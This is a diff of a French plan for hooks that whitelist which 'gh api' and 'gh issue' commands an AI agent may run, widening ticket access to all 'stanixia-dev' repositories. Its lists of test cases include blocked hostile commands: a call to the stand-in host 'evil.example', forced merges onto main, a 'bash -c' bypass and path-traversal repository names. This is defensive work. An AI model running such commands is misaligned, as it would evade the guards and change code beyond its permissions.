@@ -4,7 +4,7 @@ Statut : en cours
 
 ## Objectif
 
-L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le trou de `gh api` est donc réel : un POST explicite ou implicite (`-f`) passe partout, par exemple `POST repos/o/r/merges` fusionnerait sur main. `gh api` passe en liste blanche (lecture libre, écriture limitée aux milestones), l'agent peut rattacher un ticket à un milestone et ouvrir ou commenter des tickets sur `stanixia-dev/kit-perso` depuis un autre dépôt. Le reste du bac à sable (fragment, sonde, tests, doc) est retiré.
+L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le trou de `gh api` est donc réel : un POST explicite ou implicite (`-f`) passe partout, par exemple `POST repos/o/r/merges` fusionnerait sur main. `gh api` passe en liste blanche (lecture libre, écriture limitée aux milestones), l'agent peut rattacher un ticket à un milestone et ouvrir ou commenter des tickets sur les dépôts `stanixia-dev/*` depuis un autre dépôt. Le reste du bac à sable (fragment, sonde, tests, doc) est retiré.
 
 ## Hors périmètre
 
@@ -15,7 +15,7 @@ L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le 
 
 ## Fichiers
 
-- `hooks/garde-git.py` — modifier — `verifie_api(args)` remplace la règle l.129 ; `verifie_issue` : `edit` limité au milestone, `-R` admis si dans `DEPOTS_TICKETS` ; textes « hors du bac à sable » reformulés (l.66-172).
+- `hooks/garde-git.py` — modifier — `verifie_api(args)` remplace la règle l.129 ; `verifie_issue` : `edit` limité au milestone, `-R` admis si `<proprio>/<nom>` avec proprio dans `PROPRIETAIRES_TICKETS` ; textes « hors du bac à sable » reformulés (l.66-172).
 - `hooks/garde-secret.py` — modifier — l.427-428 : contrôle des arguments de fichier étendu à tout `gh`, commentaire reformulé.
 - `tests/test_hooks.sh` — modifier — cas `gh api` / `gh issue` ci-dessous ; supprimer le bloc l.155-188.
 - `tests/test_secrets.sh` — modifier — commentaire l.245, un cas ajouté.
@@ -44,9 +44,9 @@ L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le 
    - `-m/--milestone <v>`, `-m<v>`, `--milestone=<v>`, `--remove-milestone` ;
    - un `-R` conforme à l'étape 4.
    Au moins une option milestone est requise. Tout autre jeton (URL comprise) bloque : « gh issue edit : seul le milestone est modifiable ».
-4. **`-R/--repo`** : constante `DEPOTS_TICKETS = {"stanixia-dev/kit-perso"}` en tête de fichier. Pour `create|new|comment|edit`, on examine tous les arguments, avant comme après la sous-commande, sous les formes `-R x`, `-Rx`, `--repo x` et `--repo=x`. La valeur est admise si `valeur.lower()` est dans `DEPOTS_TICKETS`, sinon le blocage actuel s'applique. Un groupe court avec `R` après la 1re lettre (`-wRo/r`) reste bloqué. `view|list` gardent `-R` libre.
+4. **`-R/--repo`** : constante `PROPRIETAIRES_TICKETS = {"stanixia-dev"}` en tête de fichier. Pour `create|new|comment|edit`, on examine tous les arguments, avant comme après la sous-commande, sous les formes `-R x`, `-Rx`, `--repo x` et `--repo=x`. La valeur est admise si elle a la forme exacte `<proprio>/<nom>` (un seul `/`, nom non vide, ni `.` ni `..`, pas d'URL) et que `proprio.lower()` est dans `PROPRIETAIRES_TICKETS` (tous les dépôts du compte), sinon le blocage actuel s'applique. Un groupe court avec `R` après la 1re lettre (`-wRo/r`) reste bloqué. `view|list` gardent `-R` libre.
 5. **README Tickets** :
-   - l.163 : ajouter `edit` (milestone seul) et l'exception `DEPOTS_TICKETS` ;
+   - l.163 : ajouter `edit` (milestone seul) et l'exception `PROPRIETAIRES_TICKETS` ;
    - l.167 : remplacer le résiduel `gh api` en POST par « `gh api` : lecture libre, écriture limitée aux milestones de tout dépôt accessible au jeton » ;
    - ajouter un court paragraphe « Milestones » avec les commandes autorisées types (créer, fermer par `PATCH state=closed`, `gh issue edit <n> -m`, `gh pr edit <n> --milestone`).
 6. **Retrait du bac à sable** :
@@ -78,7 +78,7 @@ L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le 
 `gh api --hostname evil.example repos/o/r/milestones -f title=x` · `gh api repos/o/r/milestones repos/o/r/merges -f title=x` ·
 `gh api graphql -f query='mutation { x }'` · `rtk gh api -X POST repos/o/r/merges -f base=main` · `bash -c 'gh api repos/o/r/merges -f base=main'` ·
 `gh issue edit 9 --milestone v1 -t x` · `gh issue edit 9 --add-label x` · `gh issue edit 9` · `gh issue edit 9 -m v1 -R o/r` ·
-`gh issue edit https://github.com/o/r/issues/9 -m v1` · `gh issue create -R stanixia-dev/kit-perso.x -t x` · `gh issue -R o/r create -t x` ·
+`gh issue edit https://github.com/o/r/issues/9 -m v1` · `gh issue create -R autre/r -t x` · `gh issue create -R stanixia-dev/.. -t x` · `gh issue create -R stanixia-dev/a/b -t x` · `gh issue create -R stanixia-dev -t x` · `gh issue -R o/r create -t x` ·
 `gh issue create -wRstanixia-dev/kit-perso -t x` · `gh issue create -R github.com/stanixia-dev/kit-perso -t x`.
 
 À ajouter, **autorisées** (0) :
@@ -88,7 +88,7 @@ L'utilisateur a retiré le bac à sable : toute commande a réseau et jeton. Le 
 `gh api -XPATCH 'repos/{owner}/{repo}/milestones/3' -f state=closed` · `gh api --method=patch /repos/o/r/milestones/3 -f state=closed` ·
 `gh api -H 'Accept: application/vnd.github+json' -X PATCH repos/o/r/milestones/3 -f state=closed` ·
 `gh issue edit 9 --milestone v1` · `gh issue edit 9 10 -m v1` · `gh issue edit 9 --milestone=v1` · `gh issue edit 9 --remove-milestone` ·
-`gh issue edit 9 -m v1 -R stanixia-dev/kit-perso` · `gh issue create -R stanixia-dev/kit-perso -t x -b y` · `gh issue create --repo=Stanixia-Dev/Kit-Perso -t x` ·
+`gh issue edit 9 -m v1 -R stanixia-dev/kit-perso` · `gh issue create -R stanixia-dev/kit-perso -t x -b y` · `gh issue create --repo=STANIXIA-DEV/kit-perso -t x` · `gh issue create -R stanixia-dev/Hive -t x` ·
 `gh issue comment 5 -Rstanixia-dev/kit-perso -b x` · `gh issue -R stanixia-dev/kit-perso create -t x` · `gh pr edit 3 --milestone v1`.
 
 Note : `code_garde` injecte la commande dans du JSON par `printf`. Les cas ne doivent donc pas contenir de guillemets doubles, d'où les apostrophes.
@@ -99,10 +99,10 @@ Note : `code_garde` injecte la commande dans du JSON par `printf`. Les cas ne do
 
 ## Lots
 
-- [ ] L1 — `gh api` en liste blanche, prioritaire (étapes 1-2)
+- [x] L1 — `gh api` en liste blanche, prioritaire (étapes 1-2)
   Fichiers : `hooks/garde-git.py`, `tests/test_hooks.sh`
   Fait quand : cas `gh api` bloqués/autorisés ci-dessus verts — `bash tests/test_hooks.sh`
-- [ ] L2 — `gh issue edit --milestone` et `-R` vers `DEPOTS_TICKETS` (étapes 3-5)
+- [x] L2 — `gh issue edit --milestone` et `-R` vers les dépôts de `PROPRIETAIRES_TICKETS` (étapes 3-5)
   Fichiers : `hooks/garde-git.py`, `tests/test_hooks.sh`, `README.md`
   Fait quand : cas `gh issue` bloqués/autorisés ci-dessus verts — `bash tests/test_hooks.sh`
 - [ ] L3 — Retrait du bac à sable, garde-secret étendu à tout `gh`, version 3.0.0 (étapes 6-9)
